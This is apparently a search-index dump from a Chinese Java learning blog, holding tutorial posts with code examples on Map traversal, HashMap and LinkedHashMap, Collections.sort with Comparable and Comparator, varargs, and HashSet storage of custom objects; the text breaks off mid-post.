1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package com.itheima.demo01.Map;import java.util.HashMap;import java.util.Iterator;import java.util.Map;import java.util.Set;/* Map集合的第一种遍历方式:通过键找值的方式 Map集合中的方法: Set&lt;K&gt; keySet() 返回此映射中包含的键的 Set 视图。 实现步骤: 1.使用Map集合中的方法keySet(),把Map集合所有的key取出来,存储到一个Set集合中 2.遍历set集合,获取Map集合中的每一个key 3.通过Map集合中的方法get(key),通过key找到value */ public class Demo02KeySet &#123; public static void main(String[] args) &#123; //创建Map集合对象 Map&lt;String,Integer&gt; map = new HashMap&lt;&gt;(); map.put(\"赵丽颖\",168); map.put(\"杨颖\",165); map.put(\"林志玲\",178); //1.使用Map集合中的方法keySet(),把Map集合所有的key取出来,存储到一个Set集合中 Set&lt;String&gt; set = map.keySet(); //2.遍历set集合,获取Map集合中的每一个key //使用迭代器遍历Set集合 Iterator&lt;String&gt; it = set.iterator(); while (it.hasNext())&#123; String key = it.next(); //3.通过Map集合中的方法get(key),通过key找到value Integer value = map.get(key); System.out.println(key+\"=\"+value); &#125; System.out.println(\"-------------------\"); //使用增强for遍历Set集合 for(String key : set)&#123; //3.通过Map集合中的方法get(key),通过key找到value Integer value = map.get(key); System.out.println(key+\"=\"+value); &#125; System.out.println(\"-------------------\"); //使用增强for遍历Set集合 for(String key : map.keySet())&#123; //3.通过Map集合中的方法get(key),通过key找到value Integer value = map.get(key); System.out.println(key+\"=\"+value); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Map接口中的常用方法","slug":"java00184Map接口中的常用方法","date":"2020-04-04T15:23:04.000Z","updated":"2020-04-04T15:36:11.822Z","comments":true,"path":"2020/04/04/java00184Map接口中的常用方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/04/java00184Map接口中的常用方法/","excerpt":"","text":"Map接口中的常用方法 Map接口中定义了很多方法，常用的如下： public V put(K key, V value): 把指定的键与指定的值添加到Map集合中。 public V remove(Object key): 把指定的键 所对应的键值对元素 在Map集合中删除，返回被删除元素的值。 public V get(Object key) 根据指定的键，在Map集合中获取对应的值。 boolean containsKey(Object key) 判断集合中是否包含指定的键。 public Set&lt;K&gt; keySet(): 获取Map集合中所有的键，存储到Set集合中。 public Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet(): 获取到Map集合中所有的键值对对象的集合(Set集合)。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111package com.itheima.demo01.Map;import java.util.HashMap;import java.util.Map;public class Demo01Map &#123; public static void main(String[] args) &#123; show04(); &#125; /* boolean containsKey(Object key) 判断集合中是否包含指定的键。 包含返回true,不包含返回false */ private static void show04() &#123; //创建Map集合对象 Map&lt;String,Integer&gt; map = new HashMap&lt;&gt;(); map.put(\"赵丽颖\",168); map.put(\"杨颖\",165); map.put(\"林志玲\",178); boolean b1 = map.containsKey(\"赵丽颖\"); System.out.println(\"b1:\"+b1);//b1:true boolean b2 = map.containsKey(\"赵颖\"); System.out.println(\"b2:\"+b2);//b2:false &#125; /* public V get(Object key) 根据指定的键，在Map集合中获取对应的值。 返回值: key存在,返回对应的value值 key不存在,返回null */ private static void show03() &#123; //创建Map集合对象 Map&lt;String,Integer&gt; map = new HashMap&lt;&gt;(); map.put(\"赵丽颖\",168); map.put(\"杨颖\",165); map.put(\"林志玲\",178); Integer v1 = map.get(\"杨颖\"); System.out.println(\"v1:\"+v1);//v1:165 Integer v2 = map.get(\"迪丽热巴\"); System.out.println(\"v2:\"+v2);//v2:null &#125; /* public V remove(Object key): 把指定的键 所对应的键值对元素 在Map集合中删除，返回被删除元素的值。 返回值:V key存在,v返回被删除的值 key不存在,v返回null */ private static void show02() &#123; //创建Map集合对象 Map&lt;String,Integer&gt; map = new HashMap&lt;&gt;(); map.put(\"赵丽颖\",168); map.put(\"杨颖\",165); map.put(\"林志玲\",178); System.out.println(map);//&#123;林志玲=178, 赵丽颖=168, 杨颖=165&#125; Integer v1 = map.remove(\"林志玲\"); System.out.println(\"v1:\"+v1);//v1:178 System.out.println(map);//&#123;赵丽颖=168, 杨颖=165&#125; //int v2 = map.remove(\"林志颖\");//自动拆箱 NullPointerException Integer v2 = map.remove(\"林志颖\"); System.out.println(\"v2:\"+v2);//v2:null System.out.println(map);//&#123;赵丽颖=168, 杨颖=165&#125; &#125; /* public V put(K key, V value): 把指定的键与指定的值添加到Map集合中。 返回值:v 存储键值对的时候,key不重复,返回值V是null 存储键值对的时候,key重复,会使用新的value替换map中重复的value,返回被替换的value值 */ private static void show01() &#123; //创建Map集合对象,多态 Map&lt;String,String&gt; map = new HashMap&lt;&gt;(); String v1 = map.put(\"李晨\", \"范冰冰1\"); System.out.println(\"v1:\"+v1);//v1:null String v2 = map.put(\"李晨\", \"范冰冰2\"); System.out.println(\"v2:\"+v2);//v2:范冰冰1 System.out.println(map);//&#123;李晨=范冰冰2&#125; map.put(\"冷锋\",\"龙小云\"); map.put(\"杨过\",\"小龙女\"); map.put(\"尹志平\",\"小龙女\"); System.out.println(map);//&#123;杨过=小龙女, 尹志平=小龙女, 李晨=范冰冰2, 冷锋=龙小云&#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Map常用子类","slug":"java00183Map常用子类","date":"2020-04-04T15:17:33.000Z","updated":"2020-04-04T15:26:20.035Z","comments":true,"path":"2020/04/04/java00183Map常用子类/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/04/java00183Map常用子类/","excerpt":"","text":"Map常用子类 通过查看Map接口描述，看到Map有多个子类，这里我们主要讲解常用的HashMap集合、LinkedHashMap集合。 HashMap&lt;K,V&gt;：存储数据采用的哈希表结构，元素的存取顺序不能保证一致。由于要保证键的唯一、不重复，需要重写键的hashCode()方法、equals()方法。 LinkedHashMap&lt;K,V&gt;：HashMap下有个子类LinkedHashMap，存储数据采用的哈希表结构+链表结构。通过链表结构可以保证元素的存取顺序一致；通过哈希表结构可以保证的键的唯一、不重复，需要重写键的hashCode()方法、equals()方法。 tips：Map接口中的集合都有两个泛型变量&lt;K,V&gt;,在使用时，要为两个泛型变量赋予数据类型。两个泛型变量&lt;K,V&gt;的数据类型可以相同，也可以不同。 java.util.HashMap&lt;k,v&gt;集合 implements Map&lt;k,v&gt;接口 ​ HashMap集合的特点: ​ 1.HashMap集合底层是哈希表:查询的速度特别的快 ​ JDK1.8之前:数组+单向链表 ​ JDK1.8之后:数组+单向链表|红黑树(链表的长度超过8):提高查询的速度 ​ 2.hashMap集合是一个无序的集合,存储元素和取出元素的顺序有可能不一致 java.util.LinkedHashMap&lt;k,v&gt;集合extends HashMap&lt;k,v&gt;集合 LinkedHashMap的特点: ​ 1.LinkedHashMap集合底层是哈希表+链表(保证迭代的顺序) ​ 2.LinkedHashMap集合是一个有序的集合,存储元素和取出元素的顺序是一致的","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Map集合概述","slug":"java00182Map集合概述","date":"2020-04-04T15:10:45.000Z","updated":"2020-04-04T15:15:55.378Z","comments":true,"path":"2020/04/04/java00182Map集合概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/04/java00182Map集合概述/","excerpt":"","text":"Map集合概述 现实生活中，我们常会看到这样的一种集合：IP地址与主机名，身份证号与个人，系统用户名与系统用户对象等，这种一一对应的关系，就叫做映射。Java提供了专门的集合类用来存放这种对象关系的对象，即java.util.Map接口。 我们通过查看Map接口描述，发现Map接口下的集合与Collection接口下的集合，它们存储数据的形式不同，如下图。 Collection中的集合，元素是孤立存在的（理解为单身），向集合中存储元素采用一个个元素的方式存储。 Map中的集合，元素是成对存在的(理解为夫妻)。每个元素由键与值两部分组成，通过键可以找对所对应的值。 Collection中的集合称为单列集合，Map中的集合称为双列集合。 需要注意的是，Map中的集合不能包含重复的键，值可以重复；每个键只能对应一个值。 java.util.Map&lt;k,v&gt;集合 Map集合的特点: 1.Map集合是一个双列集合,一个元素包含两个值(一个key,一个value) 2.Map集合中的元素,key和value的数据类型可以相同,也可以不同 3.Map集合中的元素,key是不允许重复的,value是可以重a复的 4.Map集合中的元素,key和value是一一对应","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Java_Collection集合总结","slug":"java00181总结001","date":"2020-04-02T19:21:09.000Z","updated":"2020-04-03T15:58:27.788Z","comments":true,"path":"2020/04/03/java00181总结001/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/03/java00181总结001/","excerpt":"","text":"list集合排序 Collections.sort(List&lt;T&gt; list) 要重写Comparable接口中的compareTo方法 Collections.sort(List&lt;T&gt; list，Comparator&lt;? super T&gt;) 要从写Comparator类中的compare方法 使用匿名内部类重写 往集合添加元素 Collections.addAll(Collection&lt;T&gt; c, T... elements) 打乱集合顺序 Collections.shuffle(List&lt;?&gt; list) 集合： 1.集合是java中提供的一种容器，可以用来存储多个数据。 2.长度是可变的. 3.存储的元素是对象 集合框架介绍 存储结构可以分为两大类 1.单列集合java.util.Collection 2.双列集合java.util.Map Collection是单列集合类的根接口 Collection有两个子接口: java.util.List java.util.Set List的特点是元素有序、元素可重复 . Set的特点是元素无序，而且不可重复。 List接口的主要实现类有 1.java.util.ArrayList 2.java.util.LinkedList Set接口的主要实现类有 1.java.util.HashSet 2.java.util.TreeSet 单列集合共性的方法 public boolean add(E e)：把给定的对象添加到当前集合中 。 public void clear() :清空集合中所有的元素。 public boolean remove(E e): 把给定的对象在当前集合中删除。 public boolean contains(E e): 判断当前集合中是否包含给定的对象。 public boolean isEmpty(): 判断当前集合是否为空。 public int size(): 返回集合中元素的个数。 public Object[] toArray(): 把集合中的元素，存储到数组中。 Iterator接口 迭代器(对集合进行遍历) 迭代器的使用步骤(重点): 1.使用集合中的方法iterator()获取迭代器的实现类对象,使用Iterator接口接收(多态) Iterator&lt;类名&gt; it = 集合对象.iterator(); 2.使用Iterator接口中的方法hasNext判断还有没有下一个元素 12while(it.hasNext())&#123;&#125; 3.使用Iterator接口中的方法next取出集合中的下一个元素 1类名 o = it.next(); 增强for循环 底层使用的也是迭代器 JDK1.5之后出现的新特性 所有的单列集合都可以使用增强for public interface Iterable&lt;T&gt;实现这个接口允许对象成为 “foreach” 语句的目标 123for(集合/数组的数据类型 变量名: 集合名/数组名)&#123;sout(变量名);&#125; 泛型的概念 泛型是一种未知类型,当不确定使用什么类型的时候,可以使用泛型 定义和使用含有泛型的类 123修饰符 class 类名&lt;代表泛型的变量&gt;&#123; &#125; 定义和使用含有泛型的方法 泛型定义在方法的修饰符和返回值类型之间 含有泛型的方法,在调用方法的时候确定泛型的数据类型 传递什么类型的参数,泛型就是什么类型 123修饰符 &lt;泛型&gt; 返回值类型 方法名(参数列表(使用泛型))&#123;方法体;&#125; 定义和使用含有泛型的接口 12修饰符 interface 接口名&lt;代表泛型的变量&gt; &#123; &#125; 使用有两种方法 1.在实现类中指定泛型接口类型 12public class A implements 接口名&lt;String&gt;&#123;&#125; 2.接口使用什么泛型,类就使用什么泛型 12修饰符 interface 接口名&lt;T&gt; &#123; &#125; 12public class A&lt;T&gt; implements 接口名&lt;T&gt;&#123;&#125; 泛型通配符 使用泛型类或者接口时，传递的数据中，泛型类型不确定，可以通过通配符&lt;?&gt;表示 . 使用泛型的通配符后，只能使用Object类中的共性方法，集合中元素自身方法无法使用。 ?:代表任意的数据类型 不能创建对象使用 只能作为方法的参数使用 泛型的上限： 格式：类型名称 对象名称 意义： 只能接收该类型及其子类 泛型的下限： 格式： 类型名称 对象名称 意义： 只能接收该类型及其父类型 12public static void printArray(ArrayList&lt;?&gt; list)&#123;&#125; 12345// 泛型的上限：此时的泛型?，必须是Number类型或者Number类型的子类public static void getElement1(Collection&lt;? extends Number&gt; coll)&#123;&#125;// 泛型的下限：此时的泛型?，必须是Number类型或者Number类型的父类public static void getElement2(Collection&lt;? super Number&gt; coll)&#123;&#125; 数据结构 链表 查询慢,增删快. 数组 查询快,增删慢. 队列 先进先出 栈 先进后出 红黑树 节点可以是红色的或者黑色的 根节点是黑色的 叶子节点(空节点)是黑色的 每个红色节点的字节点都是黑色的 任何一个节点到每一个叶子节点的所有路径上黑色节点相同 List集合常用方法 public void add(int index, E element): 将指定的元素，添加到该集合中的指定位置上。 public E get(int index):返回集合中指定位置的元素。 public E remove(int index): 移除列表中指定位置的元素, 返回的是被移除的元素。 public E set(int index, E element):用指定元素替换集合中指定位置的元素,返回值的更新前的元素。 索引越界异常 IndexOutOfBoundsException:索引越界异常,集合会报 ArrayIndexOutOfBoundsException:数组索引越界异常 StringIndexOutOfBoundsException:字符串索引越界异常 ArrayList集合 使用的是数组结构,查询快,增删慢 LinkedList集合 数据存储的结构是链表结构 ( 双向链表 ) 方便元素添加、删除的集合 public void addFirst(E e):将指定元素插入此列表的开头。 public void addLast(E e):将指定元素添加到此列表的结尾。 public E getFirst():返回此列表的第一个元素。 public E getLast():返回此列表的最后一个元素。 public E removeFirst():移除并返回此列表的第一个元素。 public E removeLast():移除并返回此列表的最后一个元素。 public E pop():从此列表所表示的堆栈处弹出一个元素。 public void push(E e):将元素推入此列表所表示的堆栈。 public boolean isEmpty()：如果列表不包含元素，则返回true。 public E remove(int index) 移除此列表中指定位置处的元素。将任何后续元素向左移（从索引中减 1）。返回从列表中删除的元素。 HashSet集合 是Set接口的一个实现类 存储的元素是不可重复的 元素都是无序的 底层的实现其实是一个java.util.HashMap支持 根据对象的哈希值来确定元素在集合中的存储位置 保证元素唯一性的方式依赖于：hashCode与equals方法 哈希值 JDK1.8之前，哈希表底层采用数组+链表实现的 JDK1.8 以后, 哈希表存储采用数组+链表+红黑树实现 ,当链表长度超过阈值（8）时，将链表转换为红黑树 自定义的类需要重写 hashCode和equals方法 保证对象其唯一 Set集合存储元素不重复的原理 set集合在调用add时会调用hashCode()和equals()判断元素是否重复 hashCode()会生成一个哈希值并存储在数组里 如果哈希值相同,称为哈希冲突,会在哈希值对应的链表或红黑树中查看元素是否相同,如果相同则抛弃 HashSet存储自定义类型元素 HashSet存储自定义类型元素 set集合报错元素唯一: 存储的元素(String,Integer,…Student,Person…),必须重写hashCode方法和equals方法 123456789101112131415161718192021public class Person &#123; private int age; private String name; @Override public boolean equals(Object o) &#123; if (this == o) return true; if (o == null || getClass() != o.getClass()) return false; Person person = (Person) o; //下面是比较元素 return age == person.age &amp;&amp; Objects.equals(name, person.name); &#125; @Override public int hashCode() &#123; return Objects.hash(name, age); &#125;&#125; LinkedHashSet集合 java.util.LinkedHashSet集合 extends HashSet集合 LinkedHashSet集合特点: 底层是一个哈希表(数组+链表/红黑树)+链表:多了一条链表(记录元素的存储顺序),保证元素有序 LinkedHashSet&lt;String&gt; linked = new LinkedHashSet&lt;&gt;(); 可变参数 ​ 可变参数底层就是一个数组 1.一个方法的参数列表,只能有一个可变参数 2.如果方法的参数有多个,那么可变参数必须写在参数列表的末尾 123修饰符 返回值类型 方法名(数据类型...变量名)&#123; &#125; Collections集合工具类的方法addAll和shuffle java.utils.Collections是集合工具类，用来对集合进行操作。部分方法如下： public static &lt;T&gt; boolean addAll(Collection&lt;T&gt; c, T... elements):往集合中添加一些元素。 public static void shuffle(List&lt;?&gt; list)打乱顺序:打乱集合顺序。 12Collections.addAll(list,\"a\",\"b\",\"c\",\"d\",\"e\");Collections.shuffle(list); Collections集合工具类的方法sort(List) 两个对象比较的结果有三种：大于，等于，小于。 如果要按照升序排序， 则o1 小于o2，返回（负数），相等返回0，01大于02返回（正数） 如果要按照降序排序 则o1 小于o2，返回（正数），相等返回0，01大于02返回（负数） public static&lt;T&gt; void sort(List&lt;T&gt; list):将集合中元素按照默认规则排序 sort(List&lt;T&gt; list)使用前提 被排序的集合里边存储的元素,必须实现Comparable,重写接口中的方法compareTo定义排序的规则 1Collections.sort(list01);//默认是升序 12345678910111213141516public class Person implements Comparable&lt;Person&gt;&#123; private int age; public int getAge() &#123; return age; &#125; //重写排序的规则 @Override public int compareTo(Person o) &#123; //return 0;//认为元素都是相同的 //自定义比较的规则,比较两个人的年龄(this,参数Person) //return this.getAge() - o.getAge();//年龄升序排序 //年龄降序排序公式: -(o.getAge() - this.getAge()) return o.getAge() - this.getAge();//年龄升序排序 &#125;&#125; Collections集合工具类的方法sort(List,Comparator) java.utils.Collections是集合工具类，用来对集合进行操作。部分方法如下： public static &lt;T&gt; void sort(List&lt;T&gt; list，Comparator&lt;? super T&gt; ):将集合中元素按照指定规则排序。 Comparator:相当于找一个第三方的裁判,比较两个 Comparator的排序规则: o1-o2:升序 o2 - o1 降序 12345678Collections.sort(list01, new Comparator&lt;Integer&gt;() &#123; //重写比较的规则 @Override public int compare(Integer o1, Integer o2) &#123; //return o1-o2;//升序 return o2-o1;//降序 &#125;&#125;); 123456789101112//扩展:了解Collections.sort(list02, new Comparator&lt;Student&gt;() &#123; @Override public int compare(Student o1, Student o2) &#123; //按照年龄升序排序 int result = o1.getAge()-o2.getAge(); //如果两个人年龄相同,再使用姓名的第一个字比较 if(result==0)&#123; result = o1.getName().charAt(0)-o2.getName().charAt(0); &#125; return result; &#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[{"name":"Java总结","slug":"Java总结","permalink":"https://xiaowuyoucy.github.io/tags/Java总结/"}]},{"title":"java_Collections集合工具类的方法_sort(List,Comparator)","slug":"java00180-Collections集合工具类的方法-sort-List-Comparator","date":"2020-03-21T18:04:59.000Z","updated":"2020-03-21T18:10:50.461Z","comments":true,"path":"2020/03/22/java00180-Collections集合工具类的方法-sort-List-Comparator/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00180-Collections集合工具类的方法-sort-List-Comparator/","excerpt":"","text":"Collections集合工具类的方法_sort(List,Comparator) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package com.itheima.demo05.Collections;import java.util.ArrayList;import java.util.Collections;import java.util.Comparator;/* - java.utils.Collections是集合工具类，用来对集合进行操作。部分方法如下： public static &lt;T&gt; void sort(List&lt;T&gt; list，Comparator&lt;? super T&gt; ):将集合中元素按照指定规则排序。 Comparator和Comparable的区别 Comparable:自己(this)和别人(参数)比较,自己需要实现Comparable接口,重写比较的规则compareTo方法 Comparator:相当于找一个第三方的裁判,比较两个 Comparator的排序规则: o1-o2:升序 */public class Demo03Sort &#123; public static void main(String[] args) &#123; ArrayList&lt;Integer&gt; list01 = new ArrayList&lt;&gt;(); list01.add(1); list01.add(3); list01.add(2); System.out.println(list01);//[1, 3, 2] Collections.sort(list01, new Comparator&lt;Integer&gt;() &#123; //重写比较的规则 @Override public int compare(Integer o1, Integer o2) &#123; //return o1-o2;//升序 return o2-o1;//降序 &#125; &#125;); System.out.println(list01); ArrayList&lt;Student&gt; list02 = new ArrayList&lt;&gt;(); list02.add(new Student(\"a迪丽热巴\",18)); list02.add(new Student(\"古力娜扎\",20)); list02.add(new Student(\"杨幂\",17)); list02.add(new Student(\"b杨幂\",18)); System.out.println(list02); /*Collections.sort(list02, new Comparator&lt;Student&gt;() &#123; @Override public int compare(Student o1, Student o2) &#123; //按照年龄升序排序 return o1.getAge()-o2.getAge(); &#125; &#125;);*/ //扩展:了解 Collections.sort(list02, new Comparator&lt;Student&gt;() &#123; @Override public int compare(Student o1, Student o2) &#123; //按照年龄升序排序 int result = o1.getAge()-o2.getAge(); //如果两个人年龄相同,再使用姓名的第一个字比较 if(result==0)&#123; result = o1.getName().charAt(0)-o2.getName().charAt(0); &#125; return result; &#125; &#125;); System.out.println(list02); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738package com.itheima.demo05.Collections;public class Student &#123; private String name; private int age; public Student() &#123; &#125; public Student(String name, int age) &#123; this.name = name; this.age = age; &#125; @Override public String toString() &#123; return \"Student&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_Collections集合工具类的方法_sort(List)","slug":"java00179-Collections集合工具类的方法-sort（List）","date":"2020-03-21T17:53:06.000Z","updated":"2020-03-21T18:03:47.641Z","comments":true,"path":"2020/03/22/java00179-Collections集合工具类的方法-sort（List）/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00179-Collections集合工具类的方法-sort（List）/","excerpt":"","text":"Collections集合工具类的方法_sort(List) 两个对象比较的结果有三种：大于，等于，小于。 如果要按照升序排序， 则o1 小于o2，返回（负数），相等返回0，01大于02返回（正数） 如果要按照降序排序 则o1 小于o2，返回（正数），相等返回0，01大于02返回（负数） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package com.itheima.demo05.Collections;import java.util.ArrayList;import java.util.Collections;/* - java.utils.Collections是集合工具类，用来对集合进行操作。部分方法如下： public static &lt;T&gt; void sort(List&lt;T&gt; list):将集合中元素按照默认规则排序。 注意: sort(List&lt;T&gt; list)使用前提 被排序的集合里边存储的元素,必须实现Comparable,重写接口中的方法compareTo定义排序的规则 Comparable接口的排序规则: 自己(this)-参数:升序 两个对象比较的结果有三种：大于，等于，小于。 如果要按照升序排序， 则o1 小于o2，返回（负数），相等返回0，01大于02返回（正数） 如果要按照降序排序 则o1 小于o2，返回（正数），相等返回0，01大于02返回（负数） */public class Demo02Sort &#123; public static void main(String[] args) &#123; ArrayList&lt;Integer&gt; list01 = new ArrayList&lt;&gt;(); list01.add(1); list01.add(3); list01.add(2); System.out.println(list01);//[1, 3, 2] //public static &lt;T&gt; void sort(List&lt;T&gt; list):将集合中元素按照默认规则排序。 Collections.sort(list01);//默认是升序 System.out.println(list01);//[1, 2, 3] ArrayList&lt;String&gt; list02 = new ArrayList&lt;&gt;(); list02.add(\"a\"); list02.add(\"c\"); list02.add(\"b\"); System.out.println(list02);//[a, c, b] Collections.sort(list02); System.out.println(list02);//[a, b, c] ArrayList&lt;Person&gt; list03 = new ArrayList&lt;&gt;(); list03.add(new Person(\"张三\",18)); list03.add(new Person(\"李四\",20)); list03.add(new Person(\"王五\",15)); System.out.println(list03);//[Person&#123;name='张三', age=18&#125;, Person&#123;name='李四', age=20&#125;, Person&#123;name='王五', age=15&#125;] Collections.sort(list03); System.out.println(list03); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package com.itheima.demo05.Collections;public class Person implements Comparable&lt;Person&gt;&#123; private String name; private int age; public Person() &#123; &#125; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; @Override public String toString() &#123; return \"Person&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; //重写排序的规则 @Override public int compareTo(Person o) &#123; //return 0;//认为元素都是相同的 //自定义比较的规则,比较两个人的年龄(this,参数Person) //return this.getAge() - o.getAge();//年龄升序排序 return o.getAge() - this.getAge();//年龄升序排序 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_Collections集合工具类的方法_addAll和shuffle","slug":"java00178-Collections集合工具类的方法-addAll和shuffle","date":"2020-03-21T17:49:27.000Z","updated":"2020-03-21T17:50:17.605Z","comments":true,"path":"2020/03/22/java00178-Collections集合工具类的方法-addAll和shuffle/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00178-Collections集合工具类的方法-addAll和shuffle/","excerpt":"","text":"Collections集合工具类的方法_addAll和shuffle 123456789101112131415161718192021222324252627282930package com.itheima.demo05.Collections;import java.util.ArrayList;import java.util.Collections;/* - java.utils.Collections是集合工具类，用来对集合进行操作。部分方法如下： - public static &lt;T&gt; boolean addAll(Collection&lt;T&gt; c, T... elements):往集合中添加一些元素。 - public static void shuffle(List&lt;?&gt; list) 打乱顺序:打乱集合顺序。 */public class Demo01Collections &#123; public static void main(String[] args) &#123; ArrayList&lt;String&gt; list = new ArrayList&lt;&gt;(); //往集合中添加多个元素 /*list.add(\"a\"); list.add(\"b\"); list.add(\"c\"); list.add(\"d\"); list.add(\"e\");*/ //public static &lt;T&gt; boolean addAll(Collection&lt;T&gt; c, T... elements):往集合中添加一些元素。 Collections.addAll(list,\"a\",\"b\",\"c\",\"d\",\"e\"); System.out.println(list);//[a, b, c, d, e] //public static void shuffle(List&lt;?&gt; list) 打乱顺序:打乱集合顺序。 Collections.shuffle(list); System.out.println(list);//[b, d, c, a, e], [b, d, c, a, e] &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_可变参数","slug":"java00177-可变参数","date":"2020-03-21T17:41:38.000Z","updated":"2020-03-21T17:46:02.048Z","comments":true,"path":"2020/03/22/java00177-可变参数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00177-可变参数/","excerpt":"","text":"可变参数: 是JDK1.5之后出现的新特性 使用前提: ​ 当方法的参数列表数据类型已经确定,但是参数的个数不确定,就可以使用可变参数. 使用格式: 定义方法时使用 123修饰符 返回值类型 方法名(数据类型...变量名)&#123; &#125; 可变参数的原理: ​ 可变参数底层就是一个数组,根据传递参数个数不同,会创建不同长度的数组,来存储这些参数 ​ 传递的参数个数,可以是0个(不传递),1,2…多个 可变参数的注意事项 1.一个方法的参数列表,只能有一个可变参数 2.如果方法的参数有多个,那么可变参数必须写在参数列表的末尾 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263package com.itheima.demo04.VarArgs;public class Demo01VarArgs &#123; public static void main(String[] args) &#123; //int i = add(); //int i = add(10); int i = add(10,20); //int i = add(10,20,30,40,50,60,70,80,90,100); System.out.println(i); method(\"abc\",5.5,10,1,2,3,4); &#125; /* 可变参数的注意事项 1.一个方法的参数列表,只能有一个可变参数 2.如果方法的参数有多个,那么可变参数必须写在参数列表的末尾 */ /*public static void method(int...a,String...b)&#123; &#125;*/ /*public static void method(String b,double c,int d,int...a)&#123; &#125;*/ //可变参数的特殊(终极)写法 public static void method(Object...obj)&#123; &#125; /* 定义计算(0-n)整数和的方法 已知:计算整数的和,数据类型已经确定int 但是参数的个数不确定,不知道要计算几个整数的和,就可以使用可变参数 add(); 就会创建一个长度为0的数组, new int[0] add(10); 就会创建一个长度为1的数组,存储传递来过的参数 new int[]&#123;10&#125;; add(10,20); 就会创建一个长度为2的数组,存储传递来过的参数 new int[]&#123;10,20&#125;; add(10,20,30,40,50,60,70,80,90,100); 就会创建一个长度为10的数组,存储传递来过的参数 new int[]&#123;10,20,30,40,50,60,70,80,90,100&#125;; */ public static int add(int...arr)&#123; //System.out.println(arr);//[I@2ac1fdc4 底层是一个数组 //System.out.println(arr.length);//0,1,2,10 //定义一个初始化的变量,记录累加求和 int sum = 0; //遍历数组,获取数组中的每一个元素 for (int i : arr) &#123; //累加求和 sum += i; &#125; //把求和结果返回 return sum; &#125; //定义一个方法,计算三个int类型整数的和 /*public static int add(int a,int b,int c)&#123; return a+b+c; &#125;*/ //定义一个方法,计算两个int类型整数的和 /*public static int add(int a,int b)&#123; return a+b; &#125;*/&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_LinkedHashSet集合","slug":"java00176-LinkedHashSet集合","date":"2020-03-21T17:39:08.000Z","updated":"2020-03-21T17:40:21.083Z","comments":true,"path":"2020/03/22/java00176-LinkedHashSet集合/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00176-LinkedHashSet集合/","excerpt":"","text":"LinkedHashSet集合 123456789101112131415161718192021222324252627package com.itheima.demo02.Set;import java.util.HashSet;import java.util.LinkedHashSet;/* java.util.LinkedHashSet集合 extends HashSet集合 LinkedHashSet集合特点: 底层是一个哈希表(数组+链表/红黑树)+链表:多了一条链表(记录元素的存储顺序),保证元素有序 */public class Demo04LinkedHashSet &#123; public static void main(String[] args) &#123; HashSet&lt;String&gt; set = new HashSet&lt;&gt;(); set.add(\"www\"); set.add(\"abc\"); set.add(\"abc\"); set.add(\"itcast\"); System.out.println(set);//[abc, www, itcast] 无序,不允许重复 LinkedHashSet&lt;String&gt; linked = new LinkedHashSet&lt;&gt;(); linked.add(\"www\"); linked.add(\"abc\"); linked.add(\"abc\"); linked.add(\"itcast\"); System.out.println(linked);//[www, abc, itcast] 有序,不允许重复 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_HashSet存储自定义类型元素","slug":"java00175-HashSet存储自定义类型元素","date":"2020-03-21T17:33:26.000Z","updated":"2020-03-21T17:38:05.130Z","comments":true,"path":"2020/03/22/java00175-HashSet存储自定义类型元素/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00175-HashSet存储自定义类型元素/","excerpt":"","text":"HashSet存储自定义类型元素 1234567891011121314151617181920212223242526272829303132package com.itheima.demo02.Set;import java.util.HashSet;/* HashSet存储自定义类型元素 set集合报错元素唯一: 存储的元素(String,Integer,...Student,Person...),必须重写hashCode方法和equals方法 要求: 同名同年龄的人,视为同一个人,只能存储一次 */public class Demo03HashSetSavePerson &#123; public static void main(String[] args) &#123; 